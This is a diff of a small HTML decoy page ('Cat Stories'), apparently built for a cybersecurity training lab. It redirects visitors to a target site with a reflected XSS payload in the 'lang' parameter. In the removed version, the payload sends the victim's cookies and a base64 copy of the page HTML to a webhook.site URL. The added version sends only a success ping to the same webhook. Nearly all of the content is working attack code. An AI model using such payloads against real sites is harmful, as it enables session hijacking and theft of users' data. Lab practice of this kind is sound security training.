@@ -1,18 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Cat Stories</title>
-</head>
-<body>
-    <h1>Loading Cat Stories...</h1>
-    <script>
-        // Ждем 1 секунду затем перенаправляем на целевой сайт с XSS
-        setTimeout(function() {
-            var target = 'http://web.cfcdar04rj74wpo3pmjy.labs.cyber-ed.space';
-            var payload = '"><script>fetch("https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?cookies="+document.cookie+"&html="+btoa(document.documentElement.outerHTML.substring(0,1000)))<\/script>';
-            
-            window.location.href = target + '/?lang=' + encodeURIComponent(payload);
-        }, 1000);
-    </script>
-</body>
+<script>
+setTimeout(() => {
+    window.location = 'http://web.cfcdar04rj74wpo3pmjy.labs.cyber-ed.space/?lang=' + 
+        encodeURIComponent('"><script>fetch("https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?xss=success")<\/script>');
+}, 500);
+</script>
 </html>
